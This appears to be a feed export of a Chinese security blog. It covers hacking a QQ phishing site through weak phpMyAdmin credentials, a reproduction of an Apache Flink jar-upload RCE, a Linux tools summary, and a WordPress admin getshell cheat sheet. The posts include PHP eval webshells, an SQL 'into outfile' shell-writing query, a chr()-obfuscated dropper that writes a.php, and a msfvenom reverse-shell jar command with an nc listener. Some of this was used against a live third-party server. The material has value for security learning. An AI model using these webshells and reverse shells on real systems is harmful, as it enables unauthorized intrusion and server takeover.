src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203115315.png" alt></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnblogs.com/zhuxiaoxi/p/10305940.html" target="_blank" rel="noopener">Hack The Box 获取邀请码</a></p>]]></content>
      
      
      <categories>
          
          <category> HTB系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Hack The Box </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透实战之QQ空间钓鱼网站</title>
      <link href="/2019/11/19/shen-tou-shi-zhan-zhi-qq-kong-jian-diao-yu-wang-zhan/"/>
      <url>/2019/11/19/shen-tou-shi-zhan-zhi-qq-kong-jian-diao-yu-wang-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>打开邮箱，发现垃圾箱里躺着一封垃圾邮件</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119123537.png" alt></p><p>一看就是钓鱼邮件，话不多说，搞他。</p><p>没什么技术含量，看看就好。</p><h1 id="0x01-渗透过程"><a href="#0x01-渗透过程" class="headerlink" title="0x01 渗透过程"></a>0x01 渗透过程</h1><h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><p>直接打开链接</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119123923.png" alt></p><p>除了登陆可以点击，其他超链接都是假的，也太不敬业了。</p><p>然后发现地址栏域名和垃圾邮箱里面的给的链接的域名不一样，<br>是跳转过去的，遂访问初始的域名。</p><p>打开一看，<code>phpStudy 探针 2014</code> 页面。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119153349.png" alt></p><p>phpstudy 探针 可以测试 数据库连接，试试看弱口令，<code>phpstudy</code>数据库默认账号密码<code>root</code><br>测试成功。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119153955.png" alt></p><p>然后尝试登陆<code>phpmyadmin</code></p><p>直接访问<code>url+/phpMyAdmin/</code>,使用测试成功的弱口令登陆。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119154545.png" alt></p><p>数据库里面没什么东西，因为在<code>探针页面</code>知道了物理路径，所有直接写一句话木马，连接之。</p><p><code>select &#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into outfile &#39;D:/phpstudy/WWW/test.php&#39;;</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119155056.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119155336.png" alt></p><p>这个服务器里面啥都没有，只有几个用来跳转连接的php文件，<br>就回到开头，继续搞qq钓鱼网站的。</p><h2 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h2><p>QQ钓鱼站的后台，找了一圈没找到。</p><p>访问一个不存在的文件，提示页面如下图<br>发现是用<code>UPUPW</code>搭建的，猜测会不会也有<code>phpmyadmin</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119155929.png" alt></p><p>尝试访问<code>url+/phpMyAdmin/</code> ，返回 <strong>404</strong></p><p>又尝试访问<code>url+/pmd/</code>，成了</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119160659.png" alt></p><p>尝试弱口令成功登陆</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119160813.png" alt></p><p>准备写入一句话木马，不知道物理路径。<br>使用语句</p><p><code>select @@basedir</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119161156.png" alt></p><p>然后尝试在<code>upupw</code>默认网站路径下写入木马<br>提示：<code>(Errcode: 2 &quot;No such file or directory&quot;)</code><br>写入失败，文件夹不存在</p><p>然后又尝试了其他路径名，均以失败告终<br>一筹莫展之际，<br>想到<code>upupw</code>会不会也有探针页面，会不会没删？<br>百度之，<code>upupw</code>默认的探针页面是<code>u.php</code>,<br>尝试访问</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119161857.png" alt></p><p>得到网站物理路径，然后又是愉快的上木马连接了。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://bbs.ichunqiu.com/thread-19893-1-1.html" target="_blank" rel="noopener">PhpMyAdmin 网站路径信息获取</a><br><a href="https://blog.csdn.net/q1352483315/article/details/88904001" target="_blank" rel="noopener">总结下写phpmyadmin写shell的方法</a><br><a href="https://xz.aliyun.com/t/3283" target="_blank" rel="noopener">phpmyadmin getshell姿势 - 先知社区</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 钓鱼网站 </tag>
            
            <tag> 渗透实战 </tag>
            
            <tag> phpmyadmin getshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Flink 任意 Jar 包上传致 RCE 漏洞复现</title>
      <link href="/2019/11/17/apache-flink-ren-yi-jar-bao-shang-chuan-zhi-rce-lou-dong-fu-xian/"/>
      <url>/2019/11/17/apache-flink-ren-yi-jar-bao-shang-chuan-zhi-rce-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><p>Flink核心是一个流式的数据流执行引擎，<br>其针对数据流的分布式计算提供了数据分布、数据通信以及容错机制等功能。<br>基于流执行引擎，Flink提供了诸多更高抽象层的API以便用户编写分布式任务。<br>可部署在各种集群环境，对各种大小的数据规模进行快速计算。</p><h1 id="0x01影响版本"><a href="#0x01影响版本" class="headerlink" title="0x01影响版本"></a>0x01影响版本</h1><p><strong>Apache Link &lt; 1.9.1 (当前最新)</strong></p><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>测试环境：</p><ul><li>win10</li><li>Flink 1.9.1    </li><li>java8</li></ul><p>首先下载Apache Flink 1.9.1<a href="https://www.apache.org/dyn/closer.lua/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz%0A" target="_blank" rel="noopener">Apache Flink 1.9.1</a></p><p>下载后解压，进入<code>bin</code>目录，运行<code>start-cluster.bat</code>批处理文件<br>然后访问<code>127.0.0.1:8081</code>即可</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191117141151.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191117141240.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191117141414.png" alt></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><p>使用<code>msfvenom</code>生成payload，确保生成的<code>LHOST</code>地址靶机可以访问<br>生成的<code>jar</code>包名字随意</p><p><code>msfvenom -p java/shell_reverse_tcp LHOST=x.x.x.x LPORT=x -f jar &gt;test.jar</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191117142803.png" alt></p><h3 id="开始监听"><a href="#开始监听" class="headerlink" title="开始监听"></a>开始监听</h3><p>使用<code>nc</code>监听端口</p><p><code>nc -lvvp 9999</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191117143145.png" alt></p><h3 id="上传payload"><a href="#上传payload" class="headerlink" title="上传payload"></a>上传payload</h3><p>在<code>Submit New Job</code>处点击<code>+ Add New</code>上传rec.jar文件</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191117143440.png" alt></p><p>点击名称展开，然后点击<code>Submit</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191117143618.png" alt></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191117151631.png" alt></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247483983&idx=1&sn=3dfebb1f2289549a71e821dd977ea3dc" target="_blank" rel="noopener">Apache Flink 任意 Jar 包上传致 RCE 漏洞复现</a><br><a href="https://mp.weixin.qq.com/s?__biz=Mzg4NTA0MDg2MA==&mid=2247483956&idx=1&sn=fa18ba01ba064d4fc6b821de46274f90" target="_blank" rel="noopener">Apache Flink远程代码执行预警</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Apache Flink </tag>
            
            <tag> RCE </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习总结篇——常用工具</title>
      <link href="/2019/11/07/xue-xi-zong-jie-pian-chang-yong-gong-ju/"/>
      <url>/2019/11/07/xue-xi-zong-jie-pian-chang-yong-gong-ju/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>收集整理自己用的一些工具和安装使用过程中的一些坑</p><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="一、Supervisor（进程管理）"><a href="#一、Supervisor（进程管理）" class="headerlink" title="一、Supervisor（进程管理）"></a>一、Supervisor（进程管理）</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><a href="http://supervisord.org/" target="_blank" rel="noopener">Supervisor</a>是用Python开发的一个client/server服务，<br>是Linux/Unix系统下的一个进程管理工具，不支持Windows系统。<br>它可以很方便的监听、启动、停止、重启一个或多个进程。<br>用Supervisor管理的进程，当一个进程意外被杀死，supervisort监听到进程死后，会自动将它重新拉起，<br>很方便的做到进程自动恢复的功能，不再需要自己写shell脚本来控制。</p><p>Ubuntu 安装和使用 Supervisor 会遇到很多坑 </p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><code>sudo apt install supervisor</code></p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="默认配置文件"><a href="#默认配置文件" class="headerlink" title="默认配置文件"></a>默认配置文件</h4><p>使用<code>echo_supervisord_conf</code>生成<code>supervisor</code>默认的配置文件,<br>supervisor的配置参数较多，可以参考官方配置文档——<a href="http://supervisord.org/configuration.html" target="_blank" rel="noopener">Supervisor 4.1.0 documentation</a><br><code>echo_supervisord_conf &gt; /etc/supervisor/supervisord.conf</code></p><pre><code>[unix_http_server]file=/tmp/supervisor.sock   ;UNIX socket 文件，supervisorctl 会使用;chmod=0700                 ;socket文件的mode，默认是0700;chown=nobody:nogroup       ;socket文件的owner，格式：uid:gid;[inet_http_server]         ;HTTP服务器，提供web管理界面;port=127.0.0.1:9001        ;Web管理后台运行的IP和端口，如果开放到公网，需要注意安全性;username=user              ;登录管理后台的用户名;password=123               ;登录管理后台的密码[supervisord]logfile=/tmp/supervisord.log ;日志文件，默认是 $CWD/supervisord.loglogfile_maxbytes=50MB        ;日志文件大小，超出会rotate，默认 50MB，如果设成0，表示不限制大小logfile_backups=10           ;日志文件保留备份数量默认10，设为0表示不备份loglevel=info                ;日志级别，默认info，其它: debug,warn,tracepidfile=/tmp/supervisord.pid ;pid 文件nodaemon=false               ;是否在前台启动，默认是false，即以 daemon 的方式启动minfds=1024                  ;可以打开的文件描述符的最小值，默认 1024minprocs=200                 ;可以打开的进程数的最小值，默认 200[supervisorctl]serverurl=unix:///tmp/supervisor.sock ;通过UNIX socket连接supervisord，路径与unix_http_server部分的file一致;serverurl=http://127.0.0.1:9001 ; 通过HTTP的方式连接supervisord; [program:xx]是被管理的进程配置参数，xx是进程的名称[program:xx]command=/opt/apache-tomcat-8.0.35/bin/catalina.sh run  ; 程序启动命令autostart=true       ; 在supervisord启动的时候也自动启动startsecs=10         ; 启动10秒后没有异常退出，就表示进程正常启动了，默认为1秒autorestart=true     ; 程序退出后自动重启,可选值：[unexpected,true,false]，默认为unexpected，表示进程意外杀死后才重启startretries=3       ; 启动失败自动重试次数，默认是3user=tomcat          ; 用哪个用户启动进程，默认是rootpriority=999         ; 进程启动优先级，默认999，值小的优先启动redirect_stderr=true ; 把stderr重定向到stdout，默认falsestdout_logfile_maxbytes=20MB  ; stdout 日志文件大小，默认50MBstdout_logfile_backups = 20   ; stdout 日志文件备份数，默认是10; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件）stdout_logfile=/opt/apache-tomcat-8.0.35/logs/catalina.outstopasgroup=false     ;默认为false,进程被杀死时，是否向这个进程组发送stop信号，包括子进程killasgroup=false     ;默认为false，向进程组发送kill信号，包括子进程;包含其它配置文件[include]files = /etc/supervisor/conf.d/*.conf    ;可以指定一个或多个以.conf结束的配置文件</code></pre><h4 id="进程配置文件"><a href="#进程配置文件" class="headerlink" title="进程配置文件"></a>进程配置文件</h4><p>进程管理配置参数，不建议全都写在<code>supervisord.conf</code>文件中<br>应该每个进程写一个配置文件放在include指定的目录下包含进<code>supervisord.conf文件</code>中。<br>即<code>/etc/supervisor/supervisord.conf</code>(上面)中的<code>include</code>参数设置的目录<br>使用命令新建配置，<code>name</code>自己随便取，最好和程序名相同，方便后续使用命令</p><p><code>sudo vi /etc/supervisor/conf.d/name.conf</code></p><p>按照如下模板写入配置文件(只是小部分配置，)</p><pre><code>[program:ssr]user = rootcommand = python /home/ubuntu/shadowsocksr/shadowsocks/server.py -p 1234 -k 567890 -m aes-256-cfb -O auth_sha1_v4 -o http_simpleautostart = trueautorestart = truestopasgroup = truekillasgroup = trueredirect_stderr = truestdout_logfile = /home/ubuntu/shadowsocksr/shadowsocks/supervisor.log </code></pre><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>启动 Supervisord </p><p><code>supervisord -c /etc/supervisor/supervisord.conf</code></p><p><code>supervisorctl</code>操作命令</p><pre><code>supervisorctl status  #查看所有进程的状态supervisorctl stop  #停止supervisorctl start  #启动supervisorctl restart #重启supervisorctl update #配置文件修改后可以使用该命令加载新的配置supervisorctl reload #重新启动配置中的所有程序</code></pre><h3 id="开机启动"><a href="#开机启动" class="headerlink" title="开机启动"></a>开机启动</h3><p><code>systemctl enable supervisor.service</code></p><pre><code>Synchronizing state of supervisor.service with SysV service script with /lib/systemd/systemd-sysv-install.Executing: /lib/systemd/systemd-sysv-install enable supervisor</code></pre><p>如上提示则执行下面命令</p><p><code>/lib/systemd/systemd-sysv-install enable supervisor</code></p><h3 id="报错处理"><a href="#报错处理" class="headerlink" title="报错处理"></a>报错处理</h3><hr><pre><code>/usr/lib/python2.7/dist-packages/supervisor/options.py:298: UserWarning: Supervisord is running as root and it is searching for its configuration file in default locations (including its current working directory); you probably want to specify a &quot;-c&quot; argument specifying an absolute path to a configuration file for improved security.  &#39;Supervisord is running as root and it is searching &#39;</code></pre><ul><li>解决办法：<br>以上报错由于用supervisord 直接启动supervisor 所以会引起报错，所以第一次启动的时候要加上配置文件<br>如果提示找不到文件，<code>-c</code>后面的参数改成你的<code>supervisord.conf</code>配置文件所在位置</li></ul><p><code>supervisord -c /etc/supervisor/supervisord.conf</code></p><hr><pre><code>Error: Another program is already listening on a port that one of our HTTP servers is configured to use.  Shut this program down first before starting supervisord.For help, use /usr/bin/supervisord -h</code></pre><ul><li>解决办法：</li></ul><p><code>find / -name supervisor.sock</code><br><code>unlink /name/supervisor.sock</code></p><p>注意第二个命令的<code>name</code> 替换成你自己第一条命令查找出来的路径<br>如下</p><pre><code>root@dylan:~# find / -name supervisor.sock/run/supervisor.sockroot@dylan:~# unlink /run/supervisor.sock</code></pre><hr><p><code>unix:///var/run/supervisor/supervisor.sock no such file</code></p><ul><li>解决办法一：目录权限不够</li></ul><p><code>sudo chmod 777 /run</code></p><p><code>sudo chmod 777 /var/log</code></p><ul><li>解决办法二：安装好<code>supervisor</code>没有开启服务，直接使用<code>supervisorctl</code>报的错<br> 执行如下命令，如果提示找不到文件，<code>-c</code>后面的参数改成你的<code>supervisord.conf</code>配置文件所在位置</li></ul><p><code>supervisord -c /etc/supervisor/supervisord.conf</code></p><hr><p><code>Unlinking stale socket /var/run/supervisor/supervisor.sock</code></p><ul><li>解决办法：</li></ul><p><code>unlink /var/run/supervisor/supervisor.sock</code></p><hr><h2 id="二、-ShadowsocksR"><a href="#二、-ShadowsocksR" class="headerlink" title="二、 ShadowsocksR"></a>二、 ShadowsocksR</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>ShadowsocksR WIKI 地址：<a href="https://github.com/shadowsocksr-backup/shadowsocks-rss/wiki" target="_blank" rel="noopener">shadowsocks-rss Wiki</a><br>ShadowsocksR的wiki的单用户服务端配置：<a href="https://github.com/shadowsocksr-backup/shadowsocks-rss/wiki/Server-Setup" target="_blank" rel="noopener">shadowsocks-rss单用户服务端 Wiki</a><br>windows客户端下载地址：<a href="https://github.com/shadowsocksr-backup/shadowsocksr-csharp/releases" target="_blank" rel="noopener">windows客户端</a><br>Android客户端下载地址：<a href="https://github.com/shadowsocksr-backup/shadowsocksr-android/releases" target="_blank" rel="noopener"> Android客户端</a></p><h3 id="下载安装配置"><a href="#下载安装配置" class="headerlink" title="下载安装配置"></a>下载安装配置</h3><pre><code>git clone -b manyuser https://github.com/shadowsocksr-backup/shadowsocksr.git #将github上的ShadowsocksR源码存档克隆到本地cd shadowsocksr #进入shadowsocksr根目录./initcfg.sh  #shadowsocksr初始化配置cd shadowsocks    #进入单用户版目录python server.py -p 443 -k password -m aes-256-cfb -O auth_sha1_v4 -o http_simple #快速运行#这里的选项都可以改,不明白选项的含义的话建议只改端口号和密码，即修改443和password</code></pre><h3 id="自启动"><a href="#自启动" class="headerlink" title="自启动"></a>自启动</h3><p>使用supervisor来管理ShadowsocksR进程的自启动，意外停止恢复自启动。<br>使用方法见 <strong>0x01</strong></p><h2 id="三、Tmux终端复用"><a href="#三、Tmux终端复用" class="headerlink" title="三、Tmux终端复用"></a>三、Tmux终端复用</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>我们在linux服务器上的工作一般都是通过一个远程的终端连接软件连接到远端系统进行操作，例如使用xshell或者SecureCRT工具通过ssh进行远程连接。在使用过程中，如果要做比较耗时的操作，例如有时候进行编译，或者下载大文件需要比较长的时间，一般情况下是下班之后直接运行希望第二天早上过来运行完成，这样就不用耽误工作时间。但是网络有时候不稳定，可能在半夜会出现连接断掉的情况，一旦连接断掉，我们所执行的程序也就中断，我们当然可以写一个脚本后台运行，但是还是不方便。那么有没有一种工具可以解决这样的问题呢。这就是我们这里要提到的tmux了。其实类似tmux的工具还有很多。例如gnu screen等。tmux刚好可以解决我们描述的问题，当我们在tmux中工作的时候，即使关掉SecureCRT的连接窗口，再次连接，进入tmux的会话我们之前的工作仍然在继续。</p><p>tmux是一个linux下面的工具，在使用之前需要安装，就像安装linux下的其他工具一样方便。首先我们通过SecureCRT连接登入远程的linux机器，我们将此时的环境称为终端环境。如果这个机器上并没有安装tmux，我们需要安装。例如在CentOs上是yum install tmux，完成之后我们就可以使用tmux命令了。tmux中有3种概念，会话，窗口(window)，窗格(pane)。会话有点像是tmux的服务，在后端运行，我们可以通过tmux命令创建这种服务，并且可以通过tmux命令查看，附加到后端运行的会话中。一个会话可以包含多个窗口，一个窗口可以被分割成多个窗格(pane)。</p><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>Ubuntu:</p><p><code>sudo apt install tmux</code></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="tmux的会话"><a href="#tmux的会话" class="headerlink" title="tmux的会话"></a>tmux的会话</h4><ul><li><code>tmux new -s session1  # 新建会话, -(s其实是session的头字母)</code></li><li><code>ctrl+b d  # 退出会话，回到shell的终端环境</code></li><li><code>tmux ls # 终端环境下查看会话列表</code></li><li><code>ctrl+b s # 会话环境查看会话列表</code></li><li><code>tmux a -t session1 # 从终端环境进入会话</code></li><li><code>tmux kill-session -t session1 # 终端环境中销毁会话,其中session1是要销毁的会话名。</code></li><li><code>ctrl+b : # 会话环境中进入命令模式，注意按组合键之后再按一个冒号键</code><br>  <code>kill-session -t session1 # 输完回车即可在会话环境中销毁会话。</code></li></ul><h4 id="tmux的window"><a href="#tmux的window" class="headerlink" title="tmux的window"></a>tmux的window</h4><p>一个tmux的会话中可以有多个窗口(window)，每个窗口又可以分割成多个pane(窗格)。<br>我们工作的最小单位其实是窗格。默认情况下在一个window中，只有一个大窗格，占满整个窗口区域。<br>我们在这个区域工作。</p><p><code>ctrl+b c # 创建新窗口</code></p><p>切换window</p><ul><li>ctrl+b p (previous的首字母) 切换到上一个window。</li><li>ctrl+b n (next的首字母) 切换到下一个window。</li><li>ctrl+b 0 切换到0号window，依次类推，可换成任意窗口序号</li><li>ctrl+b w (windows的首字母) 列出当前session所有window，通过上、下键切换窗口</li><li>ctrl+b l (字母L的小写)相邻的window切换</li></ul><p><code>ctrl+b &amp;  # 关闭当前window，会给出提示是否关闭当前窗口，按下y确认即可。</code></p><h4 id="tmux的pane"><a href="#tmux的pane" class="headerlink" title="tmux的pane"></a>tmux的pane</h4><p>tmux的一个窗口可以被分成多个pane(窗格)，可以做出分屏的效果。<br>分屏之后光标停留在哪个pane上，表示该pane是活动的，另外一般情况下当前pane会被绿色的线条围起来。<br>一般分屏之后当前窗口名字会重置为默认窗口名字。通过多次分屏操作，我们可以得到各种样子的分屏效果</p><p><code>ctrl+b % # 垂直分屏(组合键之后按一个百分号)，用一条垂线把当前窗口分成左右两屏。</code></p><p><code>ctrl+b &quot; # 水平分屏(组合键之后按一个双引号)，用一条水平线把当前窗口分成上下两屏。</code></p><p>切换pane</p><ul><li><code>ctrl+b o # 依次切换当前窗口下的各个pane。</code></li><li><code>ctrl+b Up|Down|Left|Right # 根据按箭方向选择切换到某个pane。</code></li><li><code>ctrl+b Space (空格键) # 对当前窗口下的所有pane重新排列布局，每按一次，换一种样式。</code></li><li><code>ctrl+b z # 最大化当前pane。再按一次后恢复。</code></li></ul><h2 id="四、open-vm-tools"><a href="#四、open-vm-tools" class="headerlink" title="四、open-vm-tools"></a>四、open-vm-tools</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>kali与win10主机间不能文件互通,但是在新版本中，<br>VMware自带的vmware-tools已经没效果，<br>官方建议是安装<code>open-vm-tools-desktop</code>来代替其跟物理机交互。</p><h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><p>如果之前安装过<code>VM Tools</code>，运行下面命令，回车即可删除</p><p><code>vmware-uninstall-tools.pl</code></p><p>安装<code>open-vm-tools-desktop</code>,记得替换源，这里不赘述。</p><p><code>apt-get install open-vm-tools-desktop fuse</code></p><p><code>reboot</code></p><h3 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h3><p><code>E: dpkg was interrupted, you must manually run &#39;dpkg --configure -a&#39; to correct the probl</code></p><pre><code>mv /usr/bin/localedef /usr/bin/localedef.olddpkg --configure -areboot  #（重启生效）</code></pre><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="一、Sublime-Text3"><a href="#一、Sublime-Text3" class="headerlink" title="一、Sublime Text3"></a>一、Sublime Text3</h2><p>详见之前的文章：<br><a href="https://dylan903.coding.me/2019/08/31/sublime-text3-shi-yong-zhi-nan/">Sublime Text3使用指南</a></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="http://www.amazonwhy.com/blog/post/6/" target="_blank" rel="noopener">ubuntu下搭建SSR服务端教程</a><br><a href="https://www.cnblogs.com/xishuai/p/ubuntu-install-supervisor.html" target="_blank" rel="noopener">Ubuntu 安装和使用 Supervisor（进程管理）</a><br><a href="https://www.cnblogs.com/wangqiguo/p/8905081.html" target="_blank" rel="noopener">tmux 终端复用详解</a></p>]]></content>
      
      
      <categories>
          
          <category> summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> summary </tag>
            
            <tag> 常用工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wordpress 后台GetShell总结</title>
      <link href="/2019/11/06/wordpress-hou-tai-getshell-zong-jie/"/>
      <url>/2019/11/06/wordpress-hou-tai-getshell-zong-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Wordpress后台Getshell的方法网上公开了很多，在此记录总结一下</p><p>相比于前台，wordpress后台的防御的就低得多<br>Wordpress的插件和主题功都可以上传和线编辑<br>很容易就可以插入木马getshell</p><p><code>?author=1</code> 遍历用户名</p><h1 id="0x01-在线编辑getshell"><a href="#0x01-在线编辑getshell" class="headerlink" title="0x01 在线编辑getshell"></a>0x01 在线编辑getshell</h1><h2 id="编辑主题"><a href="#编辑主题" class="headerlink" title="编辑主题"></a>编辑主题</h2><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p>在后台找到主题外观编辑<br>选择主题，在右侧选择php文件</p><p>在<code>PHP</code>标签内写入 <code>@eval($_POST[a]);</code><br>或者在<code>PHP</code>标签外写入 <code>&lt;?php @eval($_POST[&#39;code&#39;]);?&gt;</code><br>提交更改</p><p>路径为<br><code>url+/wp-content/themes/+主题名/+修改文件的文件名</code></p><p>连接即可</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191107003059.png" alt></p><p>也可以在这里写入</p><p><code>url+/wp-content/themes/Begin/inc/xxx.php</code></p><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p>进入主题编辑器，选择要编辑的主题，要编辑的文件<br>插入下方payload,然后访问之<br>(报下图错不用管)<br><code>url+/wp-content/themes/编辑的主题/编辑的文件</code></p><p>这样就在该目录下生成一句话木马文件<br>文件名  <code>a.php</code>   密码  <code>a</code><br>路径 <code>url+/wp-content/themes/编辑的主题/a.php</code></p><pre><code>&lt;script language=&quot;php&quot;&gt;fputs(fopen(chr(46).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112),w),chr(60).chr(63).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(97).chr(93).chr(41).chr(59).chr(63).chr(62));&lt;/script&gt;</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191107001505.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191107002023.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191107002415.png" alt></p><h2 id="编辑插件"><a href="#编辑插件" class="headerlink" title="编辑插件"></a>编辑插件</h2><p>和编辑主题思路方法一致</p><p>路径为</p><p><code>url+/wordpress321/wp-content/plugins/+更改的插件名+/+更改的文件名</code></p><h1 id="0x02-上传getshell"><a href="#0x02-上传getshell" class="headerlink" title="0x02 上传getshell"></a>0x02 上传getshell</h1><h2 id="媒体上传"><a href="#媒体上传" class="headerlink" title="媒体上传"></a>媒体上传</h2><p>在WordPress管理页面的左边单击“媒体”-“新增媒体案”<br>接着就会出来一个上传的界面，在该界面中选择“Browser 上傳功能”<br>直接选择php的Webshell上传即可；</p><h2 id="上传主题"><a href="#上传主题" class="headerlink" title="上传主题"></a>上传主题</h2><p>上传一个压缩了木马的zip<br>或者在官方主题中加入木马重新打包成zip更好<br>则木马路径为</p><p><code>url+/wp-content/themes/+主题名+/木马名</code></p><h2 id="上传插件"><a href="#上传插件" class="headerlink" title="上传插件"></a>上传插件</h2><p>和上传主题的思路一样</p><p>路径为</p><p><code>url+/wp-content/plugins/+插件名+/木马名</code></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.i0day.com/227.html" target="_blank" rel="noopener">wordpress 后台拿webshell</a><br><a href="https://www.jianshu.com/p/ffdbc362b69a" target="_blank" rel="noopener">Wordpress后台Getshell</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wordpress </tag>
            
            <tag> GetShell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>海洋cms(SEACMS) 漏洞整合复现</title>
      <link href="/2019/11/04/hai-yang-cms-v6.53-v6.54-ming-ling-zhi-xing-lou-dong-fu-xian/"/>
      <url>/2019/11/04/hai-yang-cms-v6.53-v6.54-ming-ling-zhi-xing-lou-dong-fu-xian/</url>
      
